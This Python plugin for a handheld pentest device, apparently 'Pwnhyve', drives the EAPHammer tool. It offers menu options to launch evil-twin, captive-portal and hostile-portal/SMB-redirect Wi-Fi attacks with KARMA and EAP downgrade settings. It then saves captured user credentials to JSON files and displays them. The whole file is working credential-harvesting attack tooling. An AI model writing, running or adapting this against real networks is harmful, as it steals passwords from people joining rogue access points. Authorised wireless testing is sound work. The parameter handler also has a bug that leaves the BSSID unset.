import datetime
import json
from core.plugin import BasePwnhyvePlugin
from core.EAPHammer.eaphammer import EAPHammer

hammer = EAPHammer("eaphammer")
hammer.bootstrap()
hammer.addParam("interface", "wlan0")

def assertParams(sc, params):
    ret = True
    for param in params:
        if param not in list(hammer.args):
            if ret == True:
                sc.clearText()

            sc.addText("Missing param. {}".format(param))
            ret = False

    return ret

def manage(tpil, params, listOfAssertParams, isCreds=False, isWifiCreds=True):

    for param in params:
        hammer.addParam(param)

    sc = tpil.gui.screenConsole(tpil)
    sc.addText("starting EAPHammer..")

    if assertParams(sc, listOfAssertParams):
        hammer.run()
        sc.addText("started.")
    else:
        sc.addText("\nGo to \"Edit Parameters\"\nand configure them.")
        isCreds = False

    sc.addText("hit any key to exit")

    if isCreds:
        fileHandle = open("EAPHammer-{}-Creds.json".format(datetime.datetime.now()), "w")
        sc.exit()

        carousel = tpil.gui.carouselMenu(tpil)
        carousel.fontSize = 14
        credsIndex = 0

        while True:
            if isWifiCreds:
                creds = hammer.HostapdCreds()
            else:
                creds = hammer.CaptivePortalCredentials()

            fileHandle.seek(0)
            fileHandle.write( json.dumps(creds, indent=4) )

            if len(creds) != 0:
                if isWifiCreds:
                    try:
                        cred = creds[credsIndex]
                    except:
                        credsIndex -= 1
                        cred = creds[credsIndex]

                    carousel.draw(
                        '\n'.join(["{}: {}".format(x,y) for x,y in cred.items()]),
                        "Credentials"
                    )
            else:
                carousel.draw(
                    "No credentials yet",
                    "Credentials"
                )
            
            key = tpil.waitForKey()

            if key == "left":
                credsIndex -= 1 if credsIndex > 0 else 0
            elif key == "right":
                credsIndex += 1
            else:
                break

    else:
        tpil.waitForKey()

    sc.addText("exiting..")

    hammer.stop()
    
    for param in params:
        hammer.removeParam(param)
        
    sc.exit()

class PWNHammer(BasePwnhyvePlugin):
    _icons = {
        "Edit_Parameters": "./core/icons/tool.bmp",
        "Troll_WinDefender": "./core/icons/routeremit.bmp",
        "Captive_Portal": "./core/icons/routeremit.bmp",
        "Evil_Twin": "./core/icons/routeremit.bmp",
        "Redirect_to_SMB": "./core/icons/routeremit.bmp",
    }

    def Edit_Parameters(tpil):
        # * triggers string entry
        edits = {
            "SSID": "*",
            "BSSID": "*",
            "Authentication": [
                "open", "wpa-psk",
                "wpa-eap", "owe",
                "owe-transition",
                "owe-psk"
            ],
            "Enable KARMA": ["yes", "no"],
            "EAP negotiation": [
                "balanced", "speed", "weakest",
                "gtc-downgrade"
            ],
        }

        while True:
            main = tpil.gui.menu(list(edits))
            if main == None: break

            if edits[main] == "*":
                second = tpil.gui.enterText()
            else:
                second = tpil.gui.menu(edits[main])

            if main == "SSID":
                hammer.addParam("essid", second)
            elif main == "ESSID":
                hammer.addParam("bssid", second)
            elif main == "Authentication":
                hammer.addParam("auth", second)
            elif main == "Enable KARMA":
                if second == "yes":
                    hammer.addParam("karma")
                else:
                    hammer.removeParam("karma")
            elif main == "EAP negotiation":
                hammer.addParam("negotiate", second)

    def Troll_WinDefender(tpil):
        manage(tpil, ["troll-defender"], [])

    def Captive_Portal(tpil):
        manage(tpil, ["captive-portal"], ["essid"], isCreds=True)

    def Evil_Twin(tpil):
        manage(tpil, ["creds"], ["auth", "essid"], isCreds=True)

    def Redirect_to_SMB(tpil):
        manage(tpil, ["hostile-portal"], ["essid"], isCreds=True)